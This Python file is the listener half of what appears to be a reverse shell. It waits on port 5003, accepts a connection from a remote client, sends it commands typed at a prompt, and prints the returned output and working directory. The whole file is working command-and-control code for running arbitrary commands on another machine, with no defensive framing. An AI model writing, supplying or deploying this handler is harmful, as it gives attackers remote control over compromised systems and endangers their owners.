import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024*128 #128KB max size of messages

#seperator string for sending 2 messages in one go
SEPERATOR = "<sep>"

# create a socket object
s = socket.socket()


# bind the socket to all IP adresses if this host
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attemted
client_socket, client_adress = s.accept()
print(f"{client_adress[0]}:{client_adress[1]} Connected!")

# recieve the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("{+} Current working directory: ", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue

    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just breakout of the loop
        break

    # retrive command tesults
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    result, cwd = output.split(SEPERATOR)

    #print output
    print(result)

